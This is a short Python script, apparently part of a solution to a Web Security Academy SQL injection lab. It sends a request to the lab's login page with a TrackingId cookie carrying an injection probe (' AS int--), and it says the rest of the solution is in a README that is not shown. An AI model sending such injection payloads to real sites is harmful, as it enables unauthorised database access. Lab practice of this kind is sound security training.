#!/usr/bin/env python3

import requests
from threading import Thread
from string import digits, ascii_letters


pool = digits + ascii_letters
url = "https://0a57005004a97810827d66250099003f.web-security-academy.net/login"

session = requests.Session()


# defining a fn to make the request automatically
def make_req(cookies):

    response = session.get(url, cookies=cookies)

    print(f"status code: {response.status_code}")
    print(f"url related: {response.url}")


# finding the injection point
make_req({"TrackingId": f"iwGLh8GMjg7xmbtc' AS int--"})

# the rest is in the solution (README.md)...
